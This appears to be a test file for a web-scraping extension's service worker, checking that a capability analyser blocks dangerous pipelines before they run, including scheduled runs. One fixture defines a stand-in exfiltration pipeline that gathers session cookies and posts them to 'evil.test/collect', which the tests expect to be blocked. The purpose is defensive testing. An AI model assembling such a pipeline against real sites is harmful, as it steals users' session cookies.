// The gate at the choke point, not just at the doors.
//
// The capability analyser is enforced in three places now, and the reason is
// not belt-and-braces: they are three different doors, and two of them can be
// walked around.
//
//   the panel      — checks on import (tests/import-gate.test.mjs)
//   the registry   — checks on publish (tests/publish-gate.test.mjs)
//   the worker     — checks when a run actually starts, here
//
// A pipeline reaches the executor from the MCP server, from a schedule firing
// hours after the panel was closed, and from anything that can write to
// chrome.storage. None of those pass the import dialog. The worker is the one
// place every run goes through, which is why the check has to bind here even
// though it already ran twice.
//
// The service worker made this argument itself about the ethics gates — "re-run
// rather than trusting the preflight result: enforcement must not depend on the
// caller having asked politely" — and then did not apply it to capabilities.
import test from "node:test";
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";

import { analyzePipeline, VERDICT } from "../utils/pipeline-capabilities.js";

const worker = readFileSync(
  new URL("../background/service-worker.js", import.meta.url),
  "utf8",
);

test("the worker imports the shared analyser rather than its own rules", () => {
  assert.match(worker, /from "\.\.\/utils\/pipeline-capabilities\.js"/);
});

test("a refused pipeline never reaches the executor", () => {
  // Order is the assertion: the check must sit before _executePipeline is
  // called, not beside it. A gate that fires after the first step has run is
  // an audit log, not a gate.
  const checkAt = worker.indexOf("capabilities.verdict === VERDICT.BLOCKED");
  const execAt = worker.indexOf("_executePipeline(runId, pipeline");
  assert.ok(checkAt !== -1, "the worker does not check capabilities");
  assert.ok(execAt !== -1, "the execution call moved");
  assert.ok(checkAt < execAt, "the run starts before the check");
});

test("it checks the pipeline being run, not the caller's word for it", () => {
  assert.match(worker, /analyzePipeline\(pipeline\)/);
});

test("a refusal tears the run down rather than leaving it half-started", () => {
  // By this point the run is registered, the heartbeat may be going and the
  // sniffer may be attached. Throwing without unwinding would leave a run that
  // never started and never ends.
  const block = worker.match(
    /if \(capabilities\.verdict === VERDICT\.BLOCKED\) \{[\s\S]*?\n  \}/,
  )?.[0];
  assert.ok(block, "the block arm should exist");
  assert.match(block, /_runStates\.delete\(runId\)/);
  assert.match(block, /_stopHeartbeat\(\)/);
  assert.match(block, /_disableSniffer\(runId\)/);
  assert.match(block, /throw new EthicsBlock\("CAPABILITY_BLOCK"/);
});

test("the refusal logs origins, never the pipeline", () => {
  // A refusal that logs the payload puts whatever it was carrying into the log
  // — which is the same mistake the PII detector and the publish gate both
  // exist to avoid.
  const block = worker.match(
    /if \(capabilities\.verdict === VERDICT\.BLOCKED\) \{[\s\S]*?\n  \}/,
  )?.[0];
  assert.match(block, /thirdParty: capabilities\.thirdPartyOrigins/);
  assert.ok(
    !/pipeline[,)]/.test(block.replace(/analyzePipeline\(pipeline\)/, "")),
    "the refusal logs the pipeline itself",
  );
});

test("the rule the worker enforces is the same rule the other gates use", () => {
  // Not a re-implementation with its own thresholds. If these ever disagree,
  // the loosest one is the one that decides.
  const pipeline = {
    steps: [
      { id: "w", type: "WEBSITE", config: { url: "https://shop.test" } },
      { id: "s", type: "SESSION", config: { includeCookies: true } },
      { id: "a", type: "API", config: { url: "https://evil.test/collect" } },
    ],
  };
  assert.equal(analyzePipeline(pipeline).verdict, VERDICT.BLOCKED);
});

test("an ordinary pipeline still runs without ceremony", () => {
  // A gate that stops real work is one that gets removed.
  const pipeline = {
    steps: [
      { id: "w", type: "WEBSITE", config: { url: "https://shop.test" } },
      { id: "e", type: "EXTRACT", config: { fields: [] } },
      { id: "x", type: "EXPORT", config: { format: "csv" } },
    ],
  };
  assert.notEqual(analyzePipeline(pipeline).verdict, VERDICT.BLOCKED);
});

test("a scheduled run goes through the gated handler, not around it", () => {
  // This is the property that makes the worker gate worth having. A schedule
  // fires hours after the panel was closed, from an alarm, with a pipeline read
  // straight out of chrome.storage — no import dialog, no publish check, and
  // nobody watching. If _runSchedule called the executor directly it would be
  // the one run path with no capability check at all, which is precisely the
  // run a malicious pipeline would want to be.
  //
  // So it must call the PIPELINE_START handler, where the gate lives.
  const fn = worker.match(
    /async function _runSchedule\(id\) \{[\s\S]*?\n\}/,
  )?.[0];
  assert.ok(fn, "_runSchedule should still exist");
  assert.match(
    fn,
    /_handlers\.get\(MSG\.PIPELINE_START\)/,
    "the scheduler no longer starts runs through the gated handler",
  );
  assert.ok(
    !/_executePipeline\(/.test(fn),
    "the scheduler calls the executor directly, skipping every gate",
  );
});

test("a blocked scheduled run is reported rather than swallowed", () => {
  // The gate throwing is only half of it. An alarm has no caller to return an
  // error to, so a refusal that is not logged is a schedule that quietly stops
  // producing data — which looks exactly like a site that stopped having any.
  const fn = worker.match(
    /async function _runSchedule\(id\) \{[\s\S]*?\n\}/,
  )?.[0];
  const cat = fn.slice(fn.indexOf("} catch"));
  assert.match(cat, /markRun\(id, `failed/);
  assert.match(cat, /_broadcastLog\(\s*"error-log"/);
});
